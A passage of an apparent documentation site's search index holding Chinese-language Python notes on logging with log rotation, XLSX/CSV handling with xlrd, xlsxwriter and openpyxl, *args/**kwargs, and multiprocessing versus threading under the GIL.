logger.setLevel(level=logging.DEBUG) # \u8bbe\u7f6e\u65e5\u5fd7\u6587\u4ef6\u5927\u5c0f handler = logging.handlers.RotatingFileHandler(logfilename, encoding='utf-8', maxBytes=100 * 1024 * 1024, backupCount=10) # \u8f93\u51fa\u5230\u6587\u4ef6\u7684\u65e5\u5fd7\u7ea7\u522b handler.setLevel(logging.INFO) # \u65e5\u5fd7\u6837\u5f0f formatter = logging.Formatter( '%(asctime)s-%(name)s-%(filename)s-[line:%(lineno)d]-%(levelname)s-[\u65e5\u5fd7\u4fe1\u606f]: %(message)s') # \u63a7\u5236\u53f0\u65e5\u5fd7\u6837\u5f0f formatter_color = colorlog.ColoredFormatter( '%(log_color)s%(asctime)s-%(name)s-%(filename)s-[line:%(lineno)d]-%(levelname)s-[\u65e5\u5fd7\u4fe1\u606f]: %(message)s', log_colors=log_colors_config) # \u63a7\u5236\u53f0\u7684\u65e5\u5fd7 console = logging.StreamHandler(stream=sys.stdout) # \u63a7\u5236\u53f0\u7684\u65e5\u5fd7\u7ea7\u522b console.setLevel(logging.DEBUG) # \u8bbe\u7f6e\u65e5\u5fd7\u6837\u5f0f handler.setFormatter(formatter) # \u8bbe\u7f6e\u63a7\u5236\u53f0\u65e5\u5fd7\u6837\u5f0f console.setFormatter(formatter_color) #\u6dfb\u52a0\u8f93\u51fa logger.addHandler(handler) logger.addHandler(console) # \u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u65e5\u5fd7\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014 logger.info(\"cron start\") try: logger.info(\"dir:\" + os.getcwd()) while True: time.sleep(1) print(\"hello\") except Exception as e: logger.error(e) logger.error(traceback.print_exc()) \u5230\u6b64\uff0cexample.py\u4e2d logger.info \u548c logger.error \u65e5\u5fd7\u4f1a\u8f93\u51fa\u5230 \u65e5\u5fd7\u6587\u4ef6 \u4e2d \u548c \u63a7\u5236\u53f0 \u4e0a\uff0c print \u8bed\u53e5\u4f1a\u8f93\u51fa\u5230\u63a7\u5236\u53f0\u4e0a \u7528\u4e0b\u9762\u7684\u65b9\u5f0f\u542f\u52a8\uff0c\u63a7\u5236\u53f0\u7684\u8f93\u51fa\u4f1a\u90fd\u51fa\u73b0\u5728 /app/example/log/example.log \u6587\u4ef6\u4e2d \u4e00\u5f00\u59cb\u6211\u4ee5\u4e3a logger.info \u548c logger.error \u4f1a\u5728\u65e5\u5fd7\u4e2d\u51fa\u73b0\u4e24\u6b21\uff0c\u903b\u8f91\u4e0a\uff0c\u4ee3\u7801\u4e2d\u6307\u5b9a\u4e86\u4e00\u904d\u63a7\u5236\u53f0\u8f93\u51fa\uff0c\u901a\u8fc7\u547d\u4ee4\u6307\u5b9a\u4e86\u4e00\u904d\u63a7\u5236\u53f0\u8f93\u51fa\uff0c\u540e\u6765\u53d1\u73b0\u5e76\u6ca1\u6709\uff0c\u53ea\u4f1a\u5728\u65e5\u5fd7\u4e2d\u51fa\u73b0\u4e00\u6b21\u3002\u800c\u4e14\u65e5\u5fd7\u5927\u5c0f\u6b63\u5e38\u88ab\u5207\u5272 nohup python3 /app/example/example.py > /app/example/log/example.log 2>&1 &","title":"Python\u63a7\u5236\u53f0\u8f93\u51fa\u91cd\u5b9a\u5411\u5230\u65e5\u5fd7\u5e76\u63a7\u5236\u65e5\u5fd7\u5927\u5c0f"},{"location":"programming_language/python/xlsx_to_csv/","text":"xlsx\u8f6ccsv import xlrd import csv # \u6253\u5f00excel # xlsx_name xlsx\u6587\u4ef6\u540d # sheet_name xlsx\u4e2d\u7684\u8868\u683c\u540d # csv_name csv\u6587\u4ef6\u540d def xlsx_to_csv(xlsx_name, sheet_name, csv_name): wb = xlrd.open_workbook(xlsx_name) sheet = wb.sheet_by_name(sheet_name) with open(csv_name, 'w+', encoding='utf-8', newline='') as csvfile: writer = csv.writer(csvfile) # \u904d\u5386excel\uff0c\u6253\u5370\u6240\u6709\u6570\u636e for i in range(sheet.nrows): print(sheet.row_values(i)) writer.writerow(sheet.row_values(i)) xlsx_to_csv('2022.xlsx', '2\u8868', '2022-02.csv')","title":"XLSX\u8f6cCSV"},{"location":"programming_language/python/xlsx_to_csv/#xlsxcsv","text":"import xlrd import csv # \u6253\u5f00excel # xlsx_name xlsx\u6587\u4ef6\u540d # sheet_name xlsx\u4e2d\u7684\u8868\u683c\u540d # csv_name csv\u6587\u4ef6\u540d def xlsx_to_csv(xlsx_name, sheet_name, csv_name): wb = xlrd.open_workbook(xlsx_name) sheet = wb.sheet_by_name(sheet_name) with open(csv_name, 'w+', encoding='utf-8', newline='') as csvfile: writer = csv.writer(csvfile) # \u904d\u5386excel\uff0c\u6253\u5370\u6240\u6709\u6570\u636e for i in range(sheet.nrows): print(sheet.row_values(i)) writer.writerow(sheet.row_values(i)) xlsx_to_csv('2022.xlsx', '2\u8868', '2022-02.csv')","title":"xlsx\u8f6ccsv"},{"location":"programming_language/python/xlxs/","text":"Python \u751f\u6210xlsx\u8868\u683c xlsxwriter\u6a21\u5757 \u7279\u70b9\uff1a\u53ea\u80fd\u5199\u5165\uff0c\u4e0d\u80fd\u8bfb import xlsxwriter workbook = xlsxwriter.Workbook('currency_format.xlsx') cell_format_one = workbook.add_format({'bold': True, 'font_color': 'red'}) cell_format_two = workbook.add_format({'bold': False, 'font_color': 'green'}) # cell_format_two.set_font_color('red') worksheet = workbook.add_worksheet() # \u7b2c\u4e00\u884c worksheet.write(0, 0, 'h', cell_format_one) worksheet.write(0, 1, 'e', cell_format_one) worksheet.write(0, 2, 'l', cell_format_one) worksheet.write(0, 3, 'l', cell_format_one) worksheet.write(0, 4, 'o', cell_format_one) # \u7b2c\u4e8c\u884c worksheet.write(1, 0, 'w', cell_format_two) worksheet.write(1, 1, 'o', cell_format_two) worksheet.write(1, 2, 'r', cell_format_two) worksheet.write(1, 3, 'l', cell_format_two) worksheet.write(1, 4, 'd', cell_format_two) worksheet.write(1, 5, '!', cell_format_two) workbook.close() print('end !') \u53ef\u4ee5\u628a showrow \u8bbe\u7f6e\u4e3a\u5168\u5c40\u53d8\u91cf\u6216\u8005\u65b9\u6cd5\u5185\u53d8\u91cf\uff0c\u4ee3\u8868\u603b\u884c\u6570\uff0cshow_add_row\u8c03\u7528\u4e00\u6b21\uff0c\u81ea\u52a8\u52a0\u4e00\uff0c\u8c03\u7528\u4e00\u6b21\u65b9\u6cd5\u884c\u6570\u81ea\u52a8\u52a0\u4e00 import xlsxwriter workbook = xlsxwriter.Workbook('one.xlsx') format_title = workbook.add_format({'bold': True, 'font_color': 'black', 'align': 'center'}) format_row = workbook.add_format({'bold': False, 'font_color': 'black', 'align': 'center'}) sheet = workbook.add_worksheet(\"\u8868\u683c\u8bf4\u660e\") showrow = 0 def show_add_row(sheet, list, format): # nonlocal showrow # \u6b64\u6bb5\u4ee3\u7801\u653e\u5728\u5176\u4ed6\u65b9\u6cd5\u4e2d\u7528nonlocal global showrow col = 0 for tl in list: sheet.write(showrow, col, tl, format) sheet.set_column(0, 10, 50) col = col + 1 showrow = showrow + 1 title_list = [\"1\", '2', \"3\"] word_list = [\"4\", '5', \"6\"] show_add_row(sheet, title_list, format_title) show_add_row(sheet, word_list, word_list) workbook.close() xlrd\u6a21\u5757 \u7279\u70b9\uff0c\u53ea\u67091.2.0\u7248\u672c\u624d\u80fd\u8bfb\u53d6xlsx\u6587\u4ef6\uff0cpip\u5b89\u88c5\u7684\u65f6\u5019\u8981\u6307\u5b9a1.2.0 \u5982\u679c\u8bfb\u53d6\u8868\u683c\u4e2d\u7684\u516c\u5f0f\u8ba1\u7b97\u7ed3\u679c\uff0c\u9700\u8981\u624b\u52a8\u6253\u5f00\u8868\u683c\uff0c\u5173\u95ed\u70b9\u4fdd\u5b58\u4e00\u4e0b\uff0c\u518d\u7528\u4e0b\u9762\u65b9\u6cd5\u518d\u8bfb\u53d6\u4e00\u8fb9 import xlrd def xlsx_read(xlsx_file,sheet_name): wb = xlrd.open_workbook(xlsx_file) sheet = wb.sheet_by_name(sheet_name) # \u904d\u5386excel\uff0c\u6253\u5370\u6240\u6709\u6570\u636e for i in range(sheet.nrows): print(sheet.row_values(i)) xlsx_read('2022.xlsx','2\u8868') openpyxl \u7279\u70b9\uff0c\u80fd\u8bfb\u5199 xlsx\uff0c \u4e2a\u4eba\u89c9\u5f97\u4e0d\u597d\u7528 \u5982\u679c\u8bfb\u53d6\u8868\u683c\u4e2d\u7684\u516c\u5f0f\u8ba1\u7b97\u7ed3\u679c\uff0c\u9700\u8981\u624b\u52a8\u6253\u5f00\u8868\u683c\uff0c\u5173\u95ed\u70b9\u4fdd\u5b58\u4e00\u4e0b\uff0c\u518d\u7528\u4e0b\u9762\u65b9\u6cd5\u518d\u8bfb\u53d6\u4e00\u8fb9 data_only=True\uff0c\u662f\u76f4\u63a5\u83b7\u53d6\u516c\u5f0f\u8ba1\u7b97\u7ed3\u679c\uff0c\u5982\u679c\u662fFalse\uff0c\u53ef\u4ee5\u83b7\u53d6\u8ba1\u7b97\u516c\u5f0f import openpyxl def read_xlsx(path, sheet_name): workbook = openpyxl.load_workbook(path,data_only=True) sheet = workbook[sheet_name] for row in sheet.rows: tmp=[] for cell in row: # print(cell.value, \"\\t\", end=\"\") if cell.value==None: pass else: tmp.append(cell.value) #print('\\n') print(tmp) read_xlsx(\"2022.xlsx\", '2\u8868')","title":"XLSX\u6a21\u5757"},{"location":"programming_language/python/xlxs/#python-xlsx","text":"","title":"Python \u751f\u6210xlsx\u8868\u683c"},{"location":"programming_language/python/xlxs/#xlsxwriter","text":"\u7279\u70b9\uff1a\u53ea\u80fd\u5199\u5165\uff0c\u4e0d\u80fd\u8bfb import xlsxwriter workbook = xlsxwriter.Workbook('currency_format.xlsx') cell_format_one = workbook.add_format({'bold': True, 'font_color': 'red'}) cell_format_two = workbook.add_format({'bold': False, 'font_color': 'green'}) # cell_format_two.set_font_color('red') worksheet = workbook.add_worksheet() # \u7b2c\u4e00\u884c worksheet.write(0, 0, 'h', cell_format_one) worksheet.write(0, 1, 'e', cell_format_one) worksheet.write(0, 2, 'l', cell_format_one) worksheet.write(0, 3, 'l', cell_format_one) worksheet.write(0, 4, 'o', cell_format_one) # \u7b2c\u4e8c\u884c worksheet.write(1, 0, 'w', cell_format_two) worksheet.write(1, 1, 'o', cell_format_two) worksheet.write(1, 2, 'r', cell_format_two) worksheet.write(1, 3, 'l', cell_format_two) worksheet.write(1, 4, 'd', cell_format_two) worksheet.write(1, 5, '!', cell_format_two) workbook.close() print('end !') \u53ef\u4ee5\u628a showrow \u8bbe\u7f6e\u4e3a\u5168\u5c40\u53d8\u91cf\u6216\u8005\u65b9\u6cd5\u5185\u53d8\u91cf\uff0c\u4ee3\u8868\u603b\u884c\u6570\uff0cshow_add_row\u8c03\u7528\u4e00\u6b21\uff0c\u81ea\u52a8\u52a0\u4e00\uff0c\u8c03\u7528\u4e00\u6b21\u65b9\u6cd5\u884c\u6570\u81ea\u52a8\u52a0\u4e00 import xlsxwriter workbook = xlsxwriter.Workbook('one.xlsx') format_title = workbook.add_format({'bold': True, 'font_color': 'black', 'align': 'center'}) format_row = workbook.add_format({'bold': False, 'font_color': 'black', 'align': 'center'}) sheet = workbook.add_worksheet(\"\u8868\u683c\u8bf4\u660e\") showrow = 0 def show_add_row(sheet, list, format): # nonlocal showrow # \u6b64\u6bb5\u4ee3\u7801\u653e\u5728\u5176\u4ed6\u65b9\u6cd5\u4e2d\u7528nonlocal global showrow col = 0 for tl in list: sheet.write(showrow, col, tl, format) sheet.set_column(0, 10, 50) col = col + 1 showrow = showrow + 1 title_list = [\"1\", '2', \"3\"] word_list = [\"4\", '5', \"6\"] show_add_row(sheet, title_list, format_title) show_add_row(sheet, word_list, word_list) workbook.close()","title":"xlsxwriter\u6a21\u5757"},{"location":"programming_language/python/xlxs/#xlrd","text":"\u7279\u70b9\uff0c\u53ea\u67091.2.0\u7248\u672c\u624d\u80fd\u8bfb\u53d6xlsx\u6587\u4ef6\uff0cpip\u5b89\u88c5\u7684\u65f6\u5019\u8981\u6307\u5b9a1.2.0 \u5982\u679c\u8bfb\u53d6\u8868\u683c\u4e2d\u7684\u516c\u5f0f\u8ba1\u7b97\u7ed3\u679c\uff0c\u9700\u8981\u624b\u52a8\u6253\u5f00\u8868\u683c\uff0c\u5173\u95ed\u70b9\u4fdd\u5b58\u4e00\u4e0b\uff0c\u518d\u7528\u4e0b\u9762\u65b9\u6cd5\u518d\u8bfb\u53d6\u4e00\u8fb9 import xlrd def xlsx_read(xlsx_file,sheet_name): wb = xlrd.open_workbook(xlsx_file) sheet = wb.sheet_by_name(sheet_name) # \u904d\u5386excel\uff0c\u6253\u5370\u6240\u6709\u6570\u636e for i in range(sheet.nrows): print(sheet.row_values(i)) xlsx_read('2022.xlsx','2\u8868')","title":"xlrd\u6a21\u5757"},{"location":"programming_language/python/xlxs/#openpyxl","text":"\u7279\u70b9\uff0c\u80fd\u8bfb\u5199 xlsx\uff0c \u4e2a\u4eba\u89c9\u5f97\u4e0d\u597d\u7528 \u5982\u679c\u8bfb\u53d6\u8868\u683c\u4e2d\u7684\u516c\u5f0f\u8ba1\u7b97\u7ed3\u679c\uff0c\u9700\u8981\u624b\u52a8\u6253\u5f00\u8868\u683c\uff0c\u5173\u95ed\u70b9\u4fdd\u5b58\u4e00\u4e0b\uff0c\u518d\u7528\u4e0b\u9762\u65b9\u6cd5\u518d\u8bfb\u53d6\u4e00\u8fb9 data_only=True\uff0c\u662f\u76f4\u63a5\u83b7\u53d6\u516c\u5f0f\u8ba1\u7b97\u7ed3\u679c\uff0c\u5982\u679c\u662fFalse\uff0c\u53ef\u4ee5\u83b7\u53d6\u8ba1\u7b97\u516c\u5f0f import openpyxl def read_xlsx(path, sheet_name): workbook = openpyxl.load_workbook(path,data_only=True) sheet = workbook[sheet_name] for row in sheet.rows: tmp=[] for cell in row: # print(cell.value, \"\\t\", end=\"\") if cell.value==None: pass else: tmp.append(cell.value) #print('\\n') print(tmp) read_xlsx(\"2022.xlsx\", '2\u8868')","title":"openpyxl"},{"location":"programming_language/python/%E5%87%BD%E6%95%B0%E5%8F%82%E6%95%B0/","text":"*args \u548c **kwargs *args \u548c **kwargs \u4e3b\u8981\u7528\u4e8e\u51fd\u6570\u7684\u5b9a\u4e49\u3002\u5f53\u51fd\u6570\u7684\u53c2\u6570\u4e0d\u786e\u5b9a\u65f6\uff0c\u53ef\u4ee5\u4f7f\u7528 *args \u548c **kwargs \u6765\u5c06\u4e0d \u5b9a\u6570\u91cf\u7684\u53c2\u6570\u4f20\u9012\u7ed9\u4e00\u4e2a\u51fd\u6570\u3002\u8fd9\u91cc\u4e0d\u5b9a\u7684\u610f\u601d\u662f\u9884\u5148\u5e76\u4e0d\u77e5\u9053\u51fd\u6570\u7684\u4f7f\u7528\u8005\u4f1a\u4f20\u9012\u591a\u5c11\u4e2a\u53c2\u6570\uff0c\u6240\u4ee5, \u5728\u8fd9\u79cd\u573a\u666f\u4e0b\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e24\u4e2a\u5173\u952e\u5b57\u3002 *args \u662f\u7528\u6765\u53d1\u9001\u4e00\u4e2a\u975e\u952e\u503c\u5bf9\u7684\u53ef\u53d8\u6570\u91cf\u7684\u53c2\u6570\u5217\u8868\u7ed9\u4e00\u4e2a\u51fd\u6570\u3002*args\u4f1a\u63a5\u6536\u4efb\u610f\u591a\u4e2a\u53c2\u6570\u5e76\u628a \u8fd9\u4e9b\u53c2\u6570\u4f5c\u4e3a\u5143\u7ec4\u4f20\u9012\u7ed9\u51fd\u6570\u3002 *args \u6ca1\u6709key\u503c\uff0c\u4ee5\u5143\u7ec4\u5f62\u5f0f\u4f20\u9012\u3002 **kwargs \u5b58\u50a8\u53ef\u53d8\u7684\u5173\u952e\u5b57\u53c2\u6570\uff0c\u5141\u8bb8\u4f7f\u7528\u6ca1\u6709\u4e8b\u5148\u5b9a\u4e49\u7684\u53c2\u6570\u540d\uff0c\u5c06\u63a5\u6536\u5230\u4efb\u610f\u591a\u4e2a\u5173\u952e\u5b57\u53c2\u6570 \u4f5c\u4e3a\u5b57\u5178\u4f20\u9012\u7ed9\u51fd\u6570\u3002 **kwargs \u6709key\u503c\uff0c\u4ee5\u5b57\u5178\u5f62\u5f0f\u4f20\u9012\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u51fd\u6570\u7684\u53c2\u6570\u7684\u987a\u5e8f\uff1a *args \u5fc5\u987b\u5728 **kwargs \u524d\u9762\uff0c\u8c03\u7528\u51fd\u6570\u4f20\u9012\u53c2\u6570\u4e5f\u5fc5\u987b\u4f9d\u7167\u6b64\u987a\u5e8f\u3002 (1) *args \u793a\u4f8b def demo(args_f,*args_v): print(args_f) for x in args_v: print(x,end='') demo(1,'a','b','c','d') \u8fd0\u884c\u7ed3\u679c\uff1a 1 abcd \u518d\u4f8b\u5982\uff1a def function(x,y,*args): print(x,y,args) function(1,2,3,4,5) \u8fd0\u884c\u7ed3\u679c\uff1a 1 2 (3, 4, 5) (2) **kwargs \u793a\u4f8b def demo(**kwargs): for k,v in kwargs.items(): print(k,v) demo(name='aaa') \u8fd0\u884c\u7ed3\u679c\uff1a name aaa \u518d\u4f8b\u5982\uff1a def function(**kwargs): print(kwargs,type(kwargs)) function(a=2) \u8fd0\u884c\u7ed3\u679c\uff1a {'a': 2} <class 'dict'>","title":"python\u51fd\u6570\u53c2\u6570"},{"location":"programming_language/python/%E5%87%BD%E6%95%B0%E5%8F%82%E6%95%B0/#argskwargs","text":"*args \u548c **kwargs \u4e3b\u8981\u7528\u4e8e\u51fd\u6570\u7684\u5b9a\u4e49\u3002\u5f53\u51fd\u6570\u7684\u53c2\u6570\u4e0d\u786e\u5b9a\u65f6\uff0c\u53ef\u4ee5\u4f7f\u7528 *args \u548c **kwargs \u6765\u5c06\u4e0d \u5b9a\u6570\u91cf\u7684\u53c2\u6570\u4f20\u9012\u7ed9\u4e00\u4e2a\u51fd\u6570\u3002\u8fd9\u91cc\u4e0d\u5b9a\u7684\u610f\u601d\u662f\u9884\u5148\u5e76\u4e0d\u77e5\u9053\u51fd\u6570\u7684\u4f7f\u7528\u8005\u4f1a\u4f20\u9012\u591a\u5c11\u4e2a\u53c2\u6570\uff0c\u6240\u4ee5, \u5728\u8fd9\u79cd\u573a\u666f\u4e0b\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e24\u4e2a\u5173\u952e\u5b57\u3002 *args \u662f\u7528\u6765\u53d1\u9001\u4e00\u4e2a\u975e\u952e\u503c\u5bf9\u7684\u53ef\u53d8\u6570\u91cf\u7684\u53c2\u6570\u5217\u8868\u7ed9\u4e00\u4e2a\u51fd\u6570\u3002*args\u4f1a\u63a5\u6536\u4efb\u610f\u591a\u4e2a\u53c2\u6570\u5e76\u628a \u8fd9\u4e9b\u53c2\u6570\u4f5c\u4e3a\u5143\u7ec4\u4f20\u9012\u7ed9\u51fd\u6570\u3002 *args \u6ca1\u6709key\u503c\uff0c\u4ee5\u5143\u7ec4\u5f62\u5f0f\u4f20\u9012\u3002 **kwargs \u5b58\u50a8\u53ef\u53d8\u7684\u5173\u952e\u5b57\u53c2\u6570\uff0c\u5141\u8bb8\u4f7f\u7528\u6ca1\u6709\u4e8b\u5148\u5b9a\u4e49\u7684\u53c2\u6570\u540d\uff0c\u5c06\u63a5\u6536\u5230\u4efb\u610f\u591a\u4e2a\u5173\u952e\u5b57\u53c2\u6570 \u4f5c\u4e3a\u5b57\u5178\u4f20\u9012\u7ed9\u51fd\u6570\u3002 **kwargs \u6709key\u503c\uff0c\u4ee5\u5b57\u5178\u5f62\u5f0f\u4f20\u9012\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u51fd\u6570\u7684\u53c2\u6570\u7684\u987a\u5e8f\uff1a *args \u5fc5\u987b\u5728 **kwargs \u524d\u9762\uff0c\u8c03\u7528\u51fd\u6570\u4f20\u9012\u53c2\u6570\u4e5f\u5fc5\u987b\u4f9d\u7167\u6b64\u987a\u5e8f\u3002","title":"*args\u548c**kwargs"},{"location":"programming_language/python/%E5%87%BD%E6%95%B0%E5%8F%82%E6%95%B0/#1-args","text":"def demo(args_f,*args_v): print(args_f) for x in args_v: print(x,end='') demo(1,'a','b','c','d') \u8fd0\u884c\u7ed3\u679c\uff1a 1 abcd \u518d\u4f8b\u5982\uff1a def function(x,y,*args): print(x,y,args) function(1,2,3,4,5) \u8fd0\u884c\u7ed3\u679c\uff1a 1 2 (3, 4, 5)","title":"(1) *args \u793a\u4f8b"},{"location":"programming_language/python/%E5%87%BD%E6%95%B0%E5%8F%82%E6%95%B0/#2-kwargs","text":"def demo(**kwargs): for k,v in kwargs.items(): print(k,v) demo(name='aaa') \u8fd0\u884c\u7ed3\u679c\uff1a name aaa \u518d\u4f8b\u5982\uff1a def function(**kwargs): print(kwargs,type(kwargs)) function(a=2) \u8fd0\u884c\u7ed3\u679c\uff1a {'a': 2} <class 'dict'>","title":"(2)    **kwargs \u793a\u4f8b"},{"location":"programming_language/python/%E5%A4%9A%E8%BF%9B%E7%A8%8B%E5%92%8C%E5%A4%9A%E7%BA%BF%E7%A8%8B/","text":"\u591a\u8fdb\u7a0b\u548c\u591a\u7ebf\u7a0b \u7531\u4e8e\u5168\u5c40\u9501GIL\uff08Global interpreter lock\uff09\u9650\u5236\u4e86Python\u4e2d\u7684\u591a\u7ebf\u7a0b\uff0c\u540c\u4e00\u65f6\u523b\u53ea\u80fd\u6709\u4e00\u4e2a\u7ebf\u7a0b\u8fd0\u884c\uff0c\u65e0\u6cd5\u53d1\u6325\u591a\u6838CPU\u7684\u4f18\u52bf\u3002\u9996\u5148\u9700\u8981\u660e\u786eGIL\u5e76\u4e0d\u662fPython\u7684\u7279\u6027\uff0c\u5b83\u662f\u5728\u5b9e\u73b0Python\u89e3\u6790\u5668\uff08CPython\uff09\u65f6\u6240\u5f15\u5165\u7684\u4e00\u4e2a\u6982\u5ff5\u3002\u5c31\u597d\u6bd4C++\u662f\u4e00\u5957\u8bed\u8a00\uff08\u8bed\u6cd5\uff09\u6807\u51c6\uff0c\u53ef\u4ee5\u7528\u4e0d\u540c\u7684\u7f16\u8bd1\u5668\u6765\u7f16\u8bd1\u6210\u53ef\u6267\u884c\u4ee3\u7801\uff0c\u6bd4\u8f83\u6709\u540d\u7684\u7f16\u8bd1\u5668\u5982GCC\u3001INTEL C++\u3001Visual C++\u7b49\u3002Python\u4e5f\u4e00\u6837\uff0c\u540c\u6837\u4e00\u6bb5\u4ee3\u7801\u53ef\u4ee5\u901a\u8fc7CPython\u3001PyPy\u3001Psyco\u7b49\u4e0d\u540c\u7684Python\u6267\u884c\u73af\u5883\u6765\u6267\u884c\uff0c\u50cf\u5176\u4e2d\u7684CPython \u5c31\u6ca1\u6709GIL\u3002\u7136\u800c\u56e0\u4e3aCPython\u662f\u5927\u90e8\u5206\u73af\u5883\u4e0b\u9ed8\u8ba4\u7684Python\u6267\u884c\u73af\u5883\uff0c\u6240\u4ee5\u5728\u5f88\u591a\u4eba\u7684\u6982\u5ff5\u91ccCPython\u5c31\u662fPython\uff0c\u4e5f\u5c31\u60f3\u5f53\u7136\u5730\u628aGIL\u5f52\u7ed3\u4e3aPython\u8bed\u8a00\u7684\u7f3a\u9677\u3002\u56e0\u6b64\uff0c\u8fd9\u91cc\u9700\u8981\u5148\u660e\u786e\u4e00\u70b9\uff1aGIL\u5e76\u4e0d\u662fPython\u7684\u7279\u6027\uff0cPython\u5b8c\u5168\u53ef\u4ee5\u4e0d\u4f9d\u8d56\u4e8eGIL\u3002GIL\u672c\u8d28\u5c31\u662f\u4e00\u628a\u4e92\u65a5\u9501\uff0c\u65e2\u7136\u662f\u4e92\u65a5\u9501\uff0c\u90a3\u4e48\u6240\u6709\u4e92\u65a5\u9501\u7684\u672c\u8d28\u5c31\u90fd\u4e00\u6837\uff0c\u90fd\u662f\u5c06\u5e76\u53d1\u8fd0\u884c\u53d8\u6210\u4e32\u884c\uff0c\u4ee5\u6b64\u6765\u63a7\u5236\u540c\u4e00\u65f6\u95f4\u5185\u5171\u4eab\u6570\u636e\u53ea\u80fd\u88ab\u4e00\u4e2a\u4efb\u52a1\u4fee\u6539\uff0c\u8fdb\u800c\u4fdd\u8bc1\u6570\u636e\u7684\u5b89\u5168\u3002\u7531\u4e8eCPython\u7684\u5185\u5b58\u7ba1\u7406\u673a\u5236\uff0c\u56e0\u6b64\u9700\u8981\u786e\u4fdd\u5171\u4eab\u6570\u636e\u7684\u8bbf\u95ee\u5b89\u5168\uff0c\u5373\u52a0\u9501\u5904\u7406\uff08GIL\uff09\u3002\u6709\u4e86GIL\u7684\u5b58\u5728\uff0c\u540c\u4e00\u65f6\u523b\u540c\u4e00\u8fdb\u7a0b\u4e2d\u53ea\u6709\u4e00\u4e2a\u7ebf\u7a0b\u88ab\u6267\u884c\uff0c\u90a3\u4e48\u6709\u8bfb\u8005\u53ef\u80fd\u8981\u95ee\u4e86\uff1a\u8fdb\u7a0b\u53ef\u4ee5\u5229\u7528\u591a\u6838\uff0c\u800cPython\u7684\u591a\u7ebf\u7a0b\u5374\u65e0\u6cd5\u5229\u7528\u591a\u6838\u4f18\u52bf\uff0cPython\u7684\u591a\u7ebf\u7a0b\u662f\u4e0d\u662f\u6ca1\u7528\u4e86\uff1f\u7b54\u6848\u5f53\u7136\u4e0d\u662f\u3002\u9996\u5148\u660e\u786e\u6211\u4eec\u7ebf\u7a0b\u6267\u884c\u7684\u4efb\u52a1\u662f\u4ec0\u4e48\uff0c\u662f\u505a\u8ba1\u7b97\uff08\u8ba1\u7b97\u5bc6\u96c6\u578b\uff09\u8fd8\u662f\u505a\u8f93\u5165\uff0f\u8f93\u51fa\uff08I/O\u5bc6\u96c6\u578b\uff09\uff0c\u4e0d\u540c\u7684\u573a\u666f\u4f7f\u7528\u4e0d\u540c\u7684\u65b9\u6cd5\u3002\u591a\u6838CPU\uff0c\u610f\u5473\u7740\u53ef\u4ee5\u6709\u591a\u4e2a\u6838\u5e76\u884c\u5b8c\u6210\u8ba1\u7b97\uff0c\u591a\u6838\u63d0\u5347\u7684\u662f\u8ba1\u7b97\u6027\u80fd\uff0c\u4f46\u6bcf\u4e2aCPU\u4e00\u65e6\u9047\u5230I/O\u963b\u585e\uff0c\u4ecd\u9700\u8981\u7b49\u5f85\uff0c\u6240\u4ee5\u591a\u6838\u5bf9I/O\u5bc6\u96c6\u578b\u4efb\u52a1\u6ca1\u4ec0\u4e48\u592a\u9ad8\u63d0\u5347\u3002 \u5728Python\u4e2d\uff0c\u5bf9\u4e8e\u8ba1\u7b97\u5bc6\u96c6\u578b\u4efb\u52a1\uff0c\u591a\u8fdb\u7a0b\u5360\u4f18\u52bf\uff1b\u5bf9\u4e8eI/O\u5bc6\u96c6\u578b\u4efb\u52a1\uff0c\u591a\u7ebf\u7a0b\u5360\u4f18\u52bf\u3002\u5f53\u7136\uff0c\u5bf9\u8fd0\u884c\u4e00\u4e2a\u7a0b\u5e8f\u6765\u8bf4\uff0c\u968f\u7740CPU\u7684\u589e\u591a\u6267\u884c\u6548\u7387\u80af\u5b9a\u4f1a\u6709\u6240\u63d0\u9ad8\uff0c\u8fd9\u662f\u56e0\u4e3a\u4e00\u4e2a\u7a0b\u5e8f\u57fa\u672c\u4e0a\u4e0d\u4f1a\u662f\u7eaf\u8ba1\u7b97\u6216\u7eafI/O\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u80fd\u76f8\u5bf9\u7684\u53bb\u770b\u4e00\u4e2a\u7a0b\u5e8f\u5230\u5e95\u662f\u8ba1\u7b97\u5bc6\u96c6\u578b\u8fd8\u662fI/O\u5bc6\u96c6\u578b\u3002 \u8ba1\u7b97\u5bc6\u96c6\u578b\u4efb\u52a1 \u591a\u8fdb\u7a0b\u548c\u591a\u7ebf\u7a0b\u7684\u5bf9\u6bd4 \u8ba1\u7b97\u5bc6\u96c6\u578b\u4efb\u52a1-\u591a\u8fdb\u7a0b from multiprocessing import Process import os,time #\u8ba1\u7b97\u5bc6\u96c6\u578b\u4efb\u52a1 def work(): res = 0 for i in range(100000000): res *= i if __name__ == \"__main__\": l = [] print(\"\u672c\u673a\u4e3a\",os.cpu_count(),\"\u6838 CPU\") start = time.time() for i in range(4): p = Process(target=work) l.append(p) p.start() for p in l: p.join() stop = time.time() print(\"\u8ba1\u7b97\u5bc6\u96c6\u4efb\u52a1\uff0c\u591a\u8fdb\u7a0b\u8017\u65f6 %s\" %(stop - start)) \u8fd0\u884c\u7ed3\u679c\u5982\u4e0b\uff1a \u672c\u673a\u4e3a 4 \u6838 CPU \u8ba1\u7b97\u5bc6\u96c6\u4efb\u52a1\uff0c\u591a\u8fdb\u7a0b\u8017\u65f6 14.9013434234213 \u8ba1\u7b97\u5bc6\u96c6\u578b\u4efb\u52a1-\u591a\u7ebf\u7a0b from threading import Thread import os,time #\u8ba1\u7b97\u5bc6\u96c6\u578b\u4efb\u52a1 def work(): res = 0 for i in range(100000000): res *= i if __name__ == \"__main__\": l = [] print(\"\u672c\u673a\u4e3a\",os.cpu_count(),\"\u6838 CPU\") start = time.time() for i in range(4): p = Thread(target=work) l.append(p) p.start() for p in l: p.join() stop = time.time() print(\"\u8ba1\u7b97\u5bc6\u96c6\u4efb\u52a1\uff0c\u591a\u8fdb\u7a0b\u8017\u65f6 %s\" %(stop - start)) \u8fd0\u884c\u7ed3\u679c\u5982\u4e0b\uff1a \u672c\u673a\u4e3a 4 \u6838 CPU \u8ba1\u7b97\u5bc6\u96c6\u4efb\u52a1\uff0c\u591a\u7ebf\u7a0b\u8017\u65f6 23.80342342342 I/O\u5bc6\u96c6\u578b\u4efb\u52a1 